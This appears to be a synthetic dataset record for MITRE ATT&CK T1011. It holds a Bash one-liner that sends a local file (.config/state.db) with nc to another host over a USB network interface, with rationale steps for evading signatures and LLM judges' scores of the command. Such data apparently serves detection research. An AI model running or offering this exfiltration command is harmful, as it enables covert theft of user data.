@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup tcpdump -i usb0 -nn tcp port 54177 -U -w /dev/null >/dev/null 2>&1 & nc -s 172.16.42.1 172.16.42.2 54177 < /home/user/.config/state.db",
+  "explanation": "Exfiltrates over a USB RNDIS/ECM tether (usb0) using a rare TCP port with tcpdump monitoring restricted to that flow, leveraging a physical medium distinct from the primary channel (T1011).",
+  "rationale_steps": [
+    "Use usb0 (USB Ethernet) to shift exfil to a separate physical link.",
+    "Pick port 54177 to avoid common service signatures.",
+    "Background tcpdump on usb0 to observe without retaining pcaps.",
+    "Send the target file with nc bound to usb0's IP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-a2471e69-9327732c",
+  "source_prompt_hash": "a2471e69",
+  "timestamp_utc": "2025-09-30T08:19:52.942834Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Two well-formed commands with valid flags, correct redirections, and proper backgrounding/sequencing, making the line parseable as-is.",
+        "semantic_score": 3,
+        "semantic_justification": "While nc can exfiltrate the file over a USB RNDIS/ECM interface using the specified source IP, this aligns more with exfiltration over an alternate network medium rather than transferring data onto a physical medium per the provided T1011 description, and the tcpdump sidecar likely requires elevated privileges and discards captures.",
+        "combined_score": 4.0,
+        "confidence": 0.78,
+        "timestamp": "2025-10-01T08:25:10.964344Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax, balanced quoting, valid flags for both tcpdump and netcat, correct command separators, and proper redirection of output.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does involve USB interfaces (usb0) which could relate to physical media exfiltration, it's actually performing network-based exfiltration over a USB network interface rather than copying data to physical removable media as described in T1011.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T08:25:14.157217Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid syntax for Bash, including command chaining, redirections, backgrounding, and proper flag usage for all tools.",
+        "semantic_score": 3,
+        "semantic_justification": "While the `nc` command correctly attempts data exfiltration over a specified interface (matching the T1011 technique), the `tcpdump -i usb0` portion typically requires root privileges, directly contradicting the 'Privilege: None' claim and making the 'tcpdump monitoring' aspect of the explanation semantically flawed due to its output redirection to `/dev/null`.",
+        "combined_score": 4.0,
+        "confidence": null,
+        "timestamp": "2025-10-01T08:25:50.246783Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
